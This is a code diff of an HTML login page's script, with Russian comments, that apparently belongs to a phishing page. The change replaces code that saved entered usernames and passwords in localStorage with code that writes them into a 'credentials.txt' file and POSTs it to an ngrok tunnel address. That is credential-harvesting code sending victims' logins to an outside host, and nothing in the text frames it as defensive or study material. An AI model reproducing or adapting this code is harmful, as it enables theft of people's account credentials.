@@ -67,21 +67,34 @@
     </div>
 
     <script>
-        // Обработка отправки формы
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            
-            // Получаем данные из формы
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Предотвращаем стандартное поведение отправки формы
 
-            // Сохраняем данные в localStorage
-            const key = `user_${Date.now()}`; // Уникальный ключ для каждого пользователя
-            localStorage.setItem(key, JSON.stringify({ username, password }));
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
 
-            // Перенаправляем на emailandpassword.html
-            window.location.href = 'Blok.html';
+            // Создаем текстовый файл с логином и паролем
+            const fileContent = `Логин: ${username}\nПароль: ${password}`;
+            const blob = new Blob([fileContent], { type: 'text/plain' });
+            const formData = new FormData();
+            formData.append('file', blob, 'credentials.txt');
+
+            // Отправляем файл на сервер через ngrok
+            fetch('https://85a6-46-112-0-10.ngrok-free.app', { // Замените на ваш ngrok URL
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Файл отправлен:", data);
+                alert("Данные отправлены!");
+            })
+            .catch(error => {
+                console.error("Ошибка отправки данных:", error);
+                alert("Ошибка отправки данных.");
+            });
         });
     </script>
+        
 </body>
 </html>
